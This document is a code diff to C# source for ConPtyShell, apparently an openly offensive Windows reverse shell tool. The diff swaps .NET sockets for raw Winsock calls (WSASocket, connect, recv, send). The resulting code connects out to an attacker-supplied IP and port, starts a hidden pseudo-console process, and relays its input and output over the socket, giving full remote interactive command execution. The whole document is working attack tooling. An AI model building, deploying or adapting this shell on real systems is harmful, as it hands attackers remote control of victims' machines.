@@ -6,6 +6,15 @@ using System.Net;
 using System.Net.Sockets;
 using System.Runtime.InteropServices;
 
+public class ConPtyShellException : Exception
+{
+    private const string error_string = "[-] ConPtyShellException: ";
+
+    public ConPtyShellException(){}
+
+    public ConPtyShellException(string message) : base(error_string + message){}
+}
+
 public static class ConPtyShell
 {
     private const string errorString = "{{{ConPtyShellException}}}\r\n";
@@ -16,7 +25,7 @@ public static class ConPtyShell
     private const uint CREATE_NO_WINDOW = 0x08000000;
     private const int STARTF_USESTDHANDLES = 0x00000100;
     private const int BUFFER_SIZE_PIPE = 1048576;
-
+    private const int WSA_FLAG_OVERLAPPED = 0x1;
     private const UInt32 INFINITE = 0xFFFFFFFF;
     private const int SW_HIDE = 0;
     private const uint GENERIC_READ = 0x80000000;
@@ -28,6 +37,8 @@ public static class ConPtyShell
     private const int STD_INPUT_HANDLE = -10;
     private const int STD_OUTPUT_HANDLE = -11;
     private const int STD_ERROR_HANDLE = -12;
+    
+    
     
     [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
     private struct STARTUPINFOEX
@@ -81,6 +92,29 @@ public static class ConPtyShell
     {
         public short X;
         public short Y;
+    }
+    
+    [StructLayout(LayoutKind.Sequential)]
+    private struct WSAData
+    {
+        public short wVersion;
+        public short wHighVersion;
+        public short iMaxSockets;
+        public short iMaxUdpDg;
+        public IntPtr lpVendorInfo;
+        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 257)]
+        public string szDescription;
+        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 129)]
+        public string szSystemStatus;
+    }
+    
+    [StructLayout(LayoutKind.Sequential)]
+    private struct SOCKADDR_IN
+    {
+        public short sin_family;
+        public short sin_port;
+        public uint sin_addr;
+        public long sin_zero;
     }
     
     [DllImport("kernel32.dll", SetLastError = true)]
@@ -157,37 +191,78 @@ public static class ConPtyShell
     [DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
     private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
     
-    private static Socket ConnectSocket(string remoteIp, int remotePort){
-        Socket s = null;
-        IPAddress remoteIpInt = IPAddress.Parse(remoteIp);
-        IPEndPoint ipEndpoint = new IPEndPoint(remoteIpInt, remotePort);
-        Socket shellSocket = new Socket(ipEndpoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
-        try{
-            shellSocket.Connect(ipEndpoint);
-            if(shellSocket.Connected)
-            s = shellSocket;
-            byte[] banner = Encoding.ASCII.GetBytes("\r\nConPtyShell - @splinter_code\r\n");
-            s.Send(banner);
+    [DllImport("ws2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
+    private static extern IntPtr WSASocket([In] AddressFamily addressFamily, [In] SocketType socketType, [In] ProtocolType protocolType, [In] IntPtr protocolInfo, [In] uint group, [In] int flags);
+
+    [DllImport("ws2_32.dll", SetLastError = true)]
+    private static extern int connect(IntPtr s, ref SOCKADDR_IN addr, int addrsize);
+
+    [DllImport("ws2_32.dll", SetLastError = true)]
+    private static extern ushort htons(ushort hostshort);
+
+    [DllImport("ws2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
+    private static extern uint inet_addr(string cp);
+
+    [DllImport("ws2_32.dll", CharSet = CharSet.Auto)]
+    private static extern Int32 WSAGetLastError();
+
+    [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError=true)]
+    private static extern Int32 WSAStartup(Int16 wVersionRequested, out WSAData wsaData);
+
+    [DllImport("ws2_32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+    private static extern int closesocket(IntPtr s);
+    
+    [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError=true)]
+    private static extern int recv(IntPtr Socket, byte[] buf, int len, uint flags);
+    
+    [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError=true)]
+    private static extern int send(IntPtr Socket, byte[] buf, int len, uint flags);
+    
+    private static IntPtr connectRemote(string remoteIp, int remotePort)
+    {
+        int port = 0;
+        int error = 0;
+        string host = remoteIp;
+
+        try {
+            port = Convert.ToInt32(remotePort);
+        } catch {
+            throw new ConPtyShellException("Specified port is invalid: " + remotePort.ToString());
         }
-        catch{
-            s = null;
+
+        WSAData data;
+        if( WSAStartup(2 << 8 | 2, out data) != 0 ) {
+            error = WSAGetLastError();
+            throw new ConPtyShellException(String.Format("WSAStartup failed with error code: {0}", error));
         }
-        return s;
+
+        IntPtr socket = IntPtr.Zero;
+        socket = WSASocket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP, IntPtr.Zero, 0, WSA_FLAG_OVERLAPPED);
+
+        SOCKADDR_IN sockinfo = new SOCKADDR_IN();
+        sockinfo.sin_family = (short)2;
+        sockinfo.sin_addr = inet_addr(host);
+        sockinfo.sin_port = (short)htons((ushort)port);
+
+        if( connect(socket, ref sockinfo, Marshal.SizeOf(sockinfo)) != 0 ) {
+            error = WSAGetLastError();
+            throw new ConPtyShellException(String.Format("WSAConnect failed with error code: {0}", error));
+        }
+
+        return socket;
     }
     
-    private static void TryParseRowsColsFromSocket(Socket shellSocket, ref uint rows, ref uint cols){
+    private static void TryParseRowsColsFromSocket(IntPtr shellSocket, ref uint rows, ref uint cols){
         Thread.Sleep(500);//little tweak for slower connections
-        if (shellSocket.Available > 0){
-            byte[] received = new byte[100];
-            int rowsTemp, colsTemp;
-            int bytesReceived = shellSocket.Receive(received);
-            string sizeReceived = Encoding.ASCII.GetString(received,0,bytesReceived); 
-            string rowsString = sizeReceived.Split(' ')[0].Trim();
-            string colsString = sizeReceived.Split(' ')[1].Trim();
-            if(Int32.TryParse(rowsString, out rowsTemp) && Int32.TryParse(colsString, out colsTemp)){
-                rows=(uint)rowsTemp;
-                cols=(uint)colsTemp;
-            }
+        byte[] received = new byte[100];
+        int rowsTemp, colsTemp;
+        int bytesReceived = recv(shellSocket, received, 100, 0);
+        string sizeReceived = Encoding.ASCII.GetString(received,0,bytesReceived); 
+        string rowsString = sizeReceived.Split(' ')[0].Trim();
+        string colsString = sizeReceived.Split(' ')[1].Trim();
+        if(Int32.TryParse(rowsString, out rowsTemp) && Int32.TryParse(colsString, out colsTemp)){
+            rows=(uint)rowsTemp;
+            cols=(uint)colsTemp;
         }
     }
     
@@ -294,19 +369,21 @@ public static class ConPtyShell
     {
         object[] threadParameters = (object[]) threadParams;
         IntPtr OutputPipeRead = (IntPtr)threadParameters[0];
-        Socket shellSocket = (Socket)threadParameters[1];
-        uint bufferSize=16*1024;
-        byte[] bytesToWrite = new byte[bufferSize];
+        IntPtr shellSocket = (IntPtr)threadParameters[1];
+        int bufferSize=256;
+        
         bool readSuccess = false;
         Int32 bytesSent = 0;
         uint dwBytesRead=0;
         do{
-            readSuccess = ReadFile(OutputPipeRead, bytesToWrite, bufferSize, out dwBytesRead, IntPtr.Zero);
-            bytesSent = shellSocket.Send(bytesToWrite, (Int32)dwBytesRead, 0);
+            byte[] bytesToWrite = new byte[bufferSize];
+            readSuccess = ReadFile(OutputPipeRead, bytesToWrite, (uint)bufferSize, out dwBytesRead, IntPtr.Zero);
+            bytesSent = send(shellSocket, bytesToWrite, (int)dwBytesRead, 0);
+            
         } while (bytesSent > 0 && readSuccess);
     }
     
-    private static Thread StartThreadReadPipeWriteSocket(IntPtr OutputPipeRead, Socket shellSocket){
+    private static Thread StartThreadReadPipeWriteSocket(IntPtr OutputPipeRead, IntPtr shellSocket){
         object[] threadParameters = new object[2];
         threadParameters[0]=OutputPipeRead;
         threadParameters[1]=shellSocket;
@@ -319,21 +396,21 @@ public static class ConPtyShell
     {
         object[] threadParameters = (object[]) threadParams;
         IntPtr InputPipeWrite = (IntPtr)threadParameters[0];
-        Socket shellSocket = (Socket)threadParameters[1];
+        IntPtr shellSocket = (IntPtr)threadParameters[1];
         IntPtr hChildProcess = (IntPtr)threadParameters[2];
-        uint bufferSize=16*1024;
-        byte[] bytesReceived = new byte[bufferSize];
+        int bufferSize=256;
         bool writeSuccess = false;
         Int32 nBytesReceived = 0;
         uint bytesWritten = 0;
         do{
-            nBytesReceived = shellSocket.Receive(bytesReceived, (Int32)bufferSize, 0);
+            byte[] bytesReceived = new byte[bufferSize];
+            nBytesReceived = recv(shellSocket, bytesReceived, bufferSize, 0);
             writeSuccess = WriteFile(InputPipeWrite, bytesReceived, (uint)nBytesReceived, out bytesWritten, IntPtr.Zero);	
         } while (nBytesReceived > 0 && writeSuccess);
         TerminateProcess(hChildProcess, 0);
     }
     
-    private static Thread StartThreadReadSocketWritePipe(IntPtr InputPipeWrite, Socket shellSocket, IntPtr hChildProcess){
+    private static Thread StartThreadReadSocketWritePipe(IntPtr InputPipeWrite, IntPtr shellSocket, IntPtr hChildProcess){
         object[] threadParameters = new object[3];
         threadParameters[0]=InputPipeWrite;
         threadParameters[1]=shellSocket;
@@ -345,8 +422,8 @@ public static class ConPtyShell
     
     public static string SpawnConPtyShell(string remoteIp, int remotePort, uint rows, uint cols, string commandLine){
         string output = "";
-        Socket shellSocket = ConnectSocket(remoteIp, remotePort);
-        if(shellSocket == null){            
+        IntPtr shellSocket = connectRemote(remoteIp, remotePort);
+        if(shellSocket == IntPtr.Zero){            
             output += string.Format("{0}Could not connect to ip {1} on port {2}", errorString, remoteIp, remotePort.ToString());
             return output;
         }
@@ -400,8 +477,7 @@ public static class ConPtyShell
         //cleanup everything
         thThreadReadPipeWriteSocket.Abort();
         thReadSocketWritePipe.Abort();
-        shellSocket.Shutdown(SocketShutdown.Both);
-        shellSocket.Close();
+        closesocket(shellSocket);
         RestoreStdHandles(oldStdIn, oldStdOut, oldStdErr);
         if(newConsoleAllocated)
             FreeConsole();
